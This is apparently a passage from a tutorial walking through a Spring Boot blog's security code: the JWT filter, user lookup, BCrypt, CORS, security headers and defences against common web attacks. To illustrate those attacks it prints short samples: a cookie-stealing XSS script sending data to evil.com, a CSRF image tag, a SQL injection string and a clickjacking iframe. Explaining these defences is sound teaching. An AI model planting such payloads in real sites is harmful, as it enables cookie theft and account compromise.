2. **User is enabled** - not banned (`isEnabled()` returns `!banned`)

**Create Authentication object:**
```java
UsernamePasswordAuthenticationToken authToken = new UsernamePasswordAuthenticationToken(
    userDetails,    // principal (the user)
    null,           // credentials (no password needed)
    userDetails.getAuthorities()  // roles/permissions
);
```

**Why null for credentials?**
- User already authenticated via JWT
- Don't need password anymore
- Credentials only needed for initial login

**Add request details:**
```java
authToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
```
- Adds IP address, session ID
- For audit logging
- Optional but good practice

**Store in SecurityContext:**
```java
SecurityContextHolder.getContext().setAuthentication(authToken);
```

**What is SecurityContext?**
- **Thread-local storage** for current user
- Each HTTP request has its own thread
- Authentication is stored per-thread

**After this line:**
- User is authenticated
- `Authentication` object available in controllers
- Security checks pass

**Continue filter chain:**
```java
filterChain.doFilter(request, response);
```
- Pass to next filter
- Eventually reaches controller

---

## Line-by-Line: CustomUserDetailsService

**File:** `backend/src/main/java/_blog/blog/service/CustomUserDetailsService.java`

### Lines 1-17: Class Declaration

```java
package _blog.blog.service;

import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Service;

import _blog.blog.repository.UserRepository;

@Service
public class CustomUserDetailsService implements UserDetailsService {

    private final UserRepository userRepository;

    public CustomUserDetailsService(UserRepository userRepository) {
        this.userRepository = userRepository;
    }
}
```

**UserDetailsService interface:**
```java
public interface UserDetailsService {
    UserDetails loadUserByUsername(String username) throws UsernameNotFoundException;
}
```

**One method:**
- Input: username
- Output: UserDetails
- Throws: UsernameNotFoundException if not found

**Why interface?**
- Spring Security works with any user source
- Database, LDAP, in-memory, etc.
- We implement for database

### Lines 19-28: Load User by Username

```java
@Override
public UserDetails loadUserByUsername(String usernameOrEmail) throws UsernameNotFoundException {
    // Try to find user by email first, then by username
    return userRepository.findByEmail(usernameOrEmail)
        .or(() -> userRepository.findByUsername(usernameOrEmail))
        .orElseThrow(() -> new UsernameNotFoundException("User not found: " + usernameOrEmail));

    // No need to build separate UserDetails object!
    // Your User entity already implements UserDetails
}
```

**Flexible lookup:**
- Try email first: `findByEmail(usernameOrEmail)`
- If not found, try username: `findByUsername(usernameOrEmail)`
- If still not found, throw exception

**Optional chaining:**
```java
Optional<User> user = userRepository.findByEmail(usernameOrEmail)  // Optional<User>
    .or(() -> userRepository.findByUsername(usernameOrEmail));     // Optional<User>
```

**Why allow email OR username?**
- Better UX - user can login with either
- Common pattern in modern apps

**Return User entity directly:**
- Our User class implements UserDetails
- No need to convert
- Spring Security can use it directly

---

## User Entity as UserDetails

**File:** `backend/src/main/java/_blog/blog/entity/User.java` (Lines 43, 103-127)

### User Implements UserDetails

```java
@Entity
@Table(name = "users")
public class User implements UserDetails {
    // ... entity fields ...

    @Override
    public Collection<? extends GrantedAuthority> getAuthorities() {
        return List.of(new SimpleGrantedAuthority("ROLE_" + role.name()));
    }

    @Override
    public String getUsername() {
        return username;
    }

    @Override
    public String getPassword() {
        return password;
    }

    @Override
    public boolean isAccountNonExpired() {
        return true;
    }

    @Override
    public boolean isAccountNonLocked() {
        return true;
    }

    @Override
    public boolean isCredentialsNonExpired() {
        return true;
    }

    @Override
    public boolean isEnabled() {
        return !banned;
    }
}
```

**Why implement UserDetails?**
- Spring Security needs UserDetails interface
- Our User entity has all required data
- Avoids creating separate UserDetails class

**UserDetails methods explained:**

### getAuthorities()

```java
@Override
public Collection<? extends GrantedAuthority> getAuthorities() {
    return List.of(new SimpleGrantedAuthority("ROLE_" + role.name()));
}
```

**Returns user's roles/permissions:**
- `role` is enum: `USER` or `ADMIN`
- Prefixed with "ROLE_": `ROLE_USER`, `ROLE_ADMIN`
- Spring Security convention requires "ROLE_" prefix

**Why prefix "ROLE_"?**
- Spring Security checks: `hasRole('ADMIN')`
- Internally checks for: `ROLE_ADMIN`
- If you don't prefix, checks won't work

**GrantedAuthority:**
- Interface representing permission
- `SimpleGrantedAuthority` is basic implementation
- Just wraps a string

### getUsername() and getPassword()

```java
@Override
public String getUsername() {
    return username;
}

@Override
public String getPassword() {
    return password;  // BCrypt hash, not plaintext!
}
```

**Simple delegation:**
- Return entity fields
- Password is already hashed
- Spring Security handles comparison

### Account Status Methods

```java
@Override
public boolean isAccountNonExpired() {
    return true;  // We don't expire accounts
}

@Override
public boolean isAccountNonLocked() {
    return true;  // We don't lock accounts
}

@Override
public boolean isCredentialsNonExpired() {
    return true;  // We don't expire passwords
}
```

**Why all true?**
- We don't implement these features
- Could add later: password expiration, account lockout
- For now, accounts never expire or lock

### isEnabled()

```java
@Override
public boolean isEnabled() {
    return !banned;
}
```

**Checks ban status:**
- If `banned = false` → `isEnabled() = true` → user can login
- If `banned = true` → `isEnabled() = false` → user CANNOT login

**Where checked:**
```java
// In JwtAuthenticationFilter:
if (jwtService.isTokenValid(jwt, userDetails) && userDetails.isEnabled()) {
    // Authenticate
}
```

**Effect of banning:**
- User's JWT becomes invalid
- Filter checks `isEnabled()`
- Returns false for banned users
- Authentication fails

---

## BCrypt Password Hashing

### How BCrypt Works

**Password storage flow:**

```
User registers with password: "password123"
    ↓
BCryptPasswordEncoder.encode("password123")
    ↓
1. Generate random salt (unique for each password)
2. Combine password + salt
3. Hash with bcrypt algorithm (multiple rounds)
4. Encode as string
    ↓
Stored in database: "$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
```

**BCrypt hash structure:**
```
$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
 │  │  │                                               │
 │  │  │                                               └─ Hash (31 chars)
 │  │  └─ Salt (22 chars)
 │  └─ Cost factor (10 = 2^10 = 1024 rounds)
 └─ Algorithm version (2a = bcrypt)
```

**Login verification:**

```
User submits password: "password123"
    ↓
BCryptPasswordEncoder.matches("password123", storedHash)
    ↓
1. Extract salt from stored hash
2. Hash submitted password with same salt
3. Compare hashes
    ↓
If match: password correct
If different: password wrong
```

### Why BCrypt is Secure

**1. Salted**
- Each password gets unique salt
- Same password → different hashes
- Prevents rainbow table attacks

**Example:**
```
User 1: password123 → $2a$10$abc...xyz
User 2: password123 → $2a$10$def...uvw  (different!)
```

**2. Adaptive (Cost Factor)**
- Cost = number of hashing rounds
- Cost 10 = 2^10 = 1024 rounds
- Can increase as computers get faster

**3. Slow by Design**
- Takes ~100ms to hash
- Prevents brute force attacks
- Attacker can only try ~10 passwords/second

**Comparison:**
```
MD5:     1,000,000,000 hashes/second (INSECURE)
BCrypt:  10 hashes/second (SECURE)
```

**4. Irreversible**
- Cannot get plaintext from hash
- Only way to verify: hash input and compare

---

## CORS Configuration

### What Problem Does CORS Solve?

**Scenario:**
- Frontend: `http://localhost:4200` (Angular)
- Backend: `http://localhost:8080` (Spring Boot)
- Different ports = different origins

**Without CORS:**
```javascript
// Frontend code
fetch('http://localhost:8080/api/posts')
  .then(response => response.json())

// Browser blocks request:
// ❌ Access to fetch at 'http://localhost:8080/api/posts'
//    from origin 'http://localhost:4200' has been blocked by CORS policy
```

**With CORS:**
```java
// Backend allows frontend origin
configuration.setAllowedOrigins(Arrays.asList("http://localhost:4200"));

// Browser allows request:
// ✅ Request successful
```

### CORS Preflight Requests

**For complex requests, browser sends preflight:**

```
1. Browser sees: POST request with JSON body
2. Browser sends preflight: OPTIONS /api/posts
   Headers:
     Origin: http://localhost:4200
     Access-Control-Request-Method: POST
     Access-Control-Request-Headers: Content-Type

3. Server responds:
   Access-Control-Allow-Origin: http://localhost:4200
   Access-Control-Allow-Methods: POST
   Access-Control-Allow-Headers: Content-Type
   Access-Control-Max-Age: 3600

4. Browser caches response for 1 hour
5. Browser sends actual POST request
```

**Simple requests (no preflight):**
- GET, HEAD, POST
- Only simple headers
- Content-Type: text/plain or application/x-www-form-urlencoded

**Complex requests (preflight required):**
- PUT, DELETE
- Content-Type: application/json
- Custom headers (Authorization)

### CORS Configuration Details

```java
configuration.setAllowedOrigins(Arrays.asList("http://localhost:4200"));
```
**Only this origin can call API**

```java
configuration.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE", "OPTIONS"));
```
**OPTIONS is required for preflight**

```java
configuration.setAllowedHeaders(Arrays.asList("Content-Type", "Authorization", ...));
```
**Explicit headers instead of wildcard**
- Why? Using `*` with credentials is forbidden by CORS spec

```java
configuration.setAllowCredentials(true);
```
**Allows sending cookies**
- Necessary for JWT in cookies
- Cannot use `*` for origins when credentials enabled

```java
configuration.setMaxAge(3600L);
```
**Cache preflight for 1 hour**
- Reduces preflight requests
- Improves performance

---

## Security Headers

### X-Frame-Options: DENY

```java
.frameOptions(frame -> frame.deny())
```

**What it does:**
- Prevents page from loading in `<iframe>`
- Response header: `X-Frame-Options: DENY`

**Prevents clickjacking:**
```html
<!-- Attacker's site -->
<iframe src="https://yourapp.com/settings/delete-account"></iframe>
<!-- User clicks "Win Prize!" button, actually clicks "Delete Account" -->
```

### HSTS (HTTP Strict Transport Security)

```java
.httpStrictTransportSecurity(hsts -> hsts
    .includeSubDomains(true)
    .maxAgeInSeconds(31536000)
)
```

**What it does:**
- Forces HTTPS for 1 year
- Browser automatically upgrades HTTP → HTTPS
- Response header: `Strict-Transport-Security: max-age=31536000; includeSubDomains`

**Prevents downgrade attacks:**
```
1. User types: http://yourapp.com
2. Attacker intercepts HTTP request
3. But browser sees HSTS header from previous visit
4. Browser automatically uses: https://yourapp.com
5. Attack prevented
```

### Content Security Policy (CSP)

```java
.contentSecurityPolicy(csp -> csp
    .policyDirectives("default-src 'self'; script-src 'self'; ...")
)
```

**What it does:**
- Controls what resources browser can load
- Prevents XSS attacks

**Policy explained:**
```
default-src 'self'           - Only load resources from same origin
script-src 'self'            - Only execute scripts from same origin
style-src 'self' 'unsafe-inline'  - Styles from same origin + inline
img-src 'self' data:         - Images from same origin + data URLs
```

**Prevents XSS:**
```html
<!-- Attacker injects: -->
<script src="https://evil.com/steal-cookies.js"></script>

<!-- Browser blocks with CSP: -->
Refused to load script from 'https://evil.com/steal-cookies.js'
because it violates the following Content Security Policy directive: "script-src 'self'"
```

---

## Stateless Sessions

### Session-Based Authentication (Traditional)

```
1. User logs in
2. Server creates session, stores in memory/database
3. Server sends session ID in cookie
4. Browser sends session ID on each request
5. Server looks up session to identify user
```

**Problems:**
- **Memory usage** - storing sessions
- **Scalability** - session synchronization across servers
- **Stickiness** - requests must go to same server

### Stateless Authentication (JWT)

```
1. User logs in
2. Server creates JWT with user info
3. Server sends JWT in cookie
4. Browser sends JWT on each request
5. Server verifies JWT signature (no database lookup)
```

**Benefits:**
- **No server state** - no session storage
- **Scalability** - any server can handle any request
- **Performance** - no session lookup

**Configuration:**
```java
.sessionManagement(session -> session
    .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
)
```

**STATELESS means:**
- Don't create HttpSession
- Don't store SecurityContext in session
- Each request is independent

---

## Common Security Vulnerabilities Addressed

### 1. XSS (Cross-Site Scripting)

**Attack:**
```javascript
// Attacker injects script in post content:
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

**Defenses:**
1. **Input validation** - `@Size`, `@NotBlank` on DTOs
2. **Content Security Policy** - Blocks external scripts
3. **HttpOnly cookies** - JavaScript can't read JWT

### 2. CSRF (Cross-Site Request Forgery)

**Attack:**
```html
<!-- Evil site -->
<img src="http://yourapp.com/posts/delete/123">
<!-- Browser sends cookies automatically -->
```

**Defenses:**
1. **SameSite cookies** - Browser doesn't send cookies to other sites
2. **CORS** - API blocks cross-origin requests
3. **JWT in Authorization header** - Not sent automatically

### 3. SQL Injection

**Attack:**
```
username: admin' OR '1'='1
```

**Defenses:**
1. **Spring Data JPA** - Uses prepared statements
2. **@Query with @Param** - Parameterized queries
3. **Hibernate** - Automatic escaping

### 4. Password Storage

**Attack:**
- Database breach exposes plaintext passwords

**Defenses:**
1. **BCrypt hashing** - Irreversible
2. **Salting** - Different hashes for same password
3. **Adaptive cost** - Slow hashing prevents brute force

### 5. Man-in-the-Middle

**Attack:**
- Attacker intercepts HTTP traffic

**Defenses:**
1. **HTTPS** - Encrypted communication
2. **HSTS** - Forces HTTPS
3. **Secure cookies** - Only sent over HTTPS

### 6. Clickjacking

**Attack:**
- Embedding your site in iframe to trick users

**Defenses:**
1. **X-Frame-Options: DENY** - Prevents iframe embedding

---

## Key Takeaways

### Spring Security Architecture

- **Filter chain** intercepts requests before controllers
- **JwtAuthenticationFilter** extracts and validates JWT
- **SecurityContext** stores current user per thread
- **UserDetailsService** loads users from database

### JWT Authentication

- **Stateless** - no server-side sessions
- **Self-contained** - all user info in token
- **Signed** - signature prevents tampering
- **Expires** - short-lived for security

### Password Security

- **BCrypt** - adaptive, salted, slow by design
- **Never store plaintext** - only hashes
- **Irreversible** - can't recover password from hash

### CORS

- **Allows cross-origin requests** from frontend
- **Preflight** for complex requests
- **Credentials** requires explicit origin (no wildcard)

### Security Headers

- **HSTS** - Forces HTTPS
- **CSP** - Blocks malicious scripts
- **X-Frame-Options** - Prevents clickjacking

---

**Next**: DTO Classes and Mapping - Understanding data transfer objects, validation, and transformation patterns! Continue?
